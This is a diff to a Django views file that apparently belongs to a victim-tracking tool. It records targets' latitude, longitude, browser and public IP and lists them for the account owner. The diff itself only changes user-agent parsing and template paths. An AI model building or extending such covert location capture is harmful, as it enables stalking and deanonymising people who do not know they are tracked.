@@ -807,7 +807,7 @@ def receivetrack(request,template,username):
     viclatitude = str(request.POST.get('latitude'))
     viclongitude = str(request.POST.get('longitude'))
 
-    vicuseragent = request.META['HTTP_USER_AGENT']
+    vicuseragent = str(request.user_agent.browser.family)
 
     publicip = str(request.META.get('HTTP_X_REAL_IP'))
 
@@ -879,9 +879,9 @@ def tracker(request):
       victim.append([victimpublicip[i],victimlocip[i],vicuseragent[i],viclatitude[i],viclongitude[i]])
 
     if victimpublicip != ['']:
-      return render(request, 'tracker.html', {'victim':victim,'url':url})
+      return render(request, 'apps/tracker.html', {'victim':victim,'url':url})
     else:
-      return render(request, 'tracker.html', {'url':url})
+      return render(request, 'apps/tracker.html', {'url':url})
 
 
 
@@ -896,12 +896,12 @@ def tracker(request):
         user.profile.victimlongitude=""
         user.profile.victimuseragent = ""
         user.save()
-        return redirect("tracker")
+        return redirect("apps/tracker")
       else:
         pass
     except:
       pass
-    return redirect('tracker')
+    return redirect('apps/tracker')
     
 
 def change_password(request):
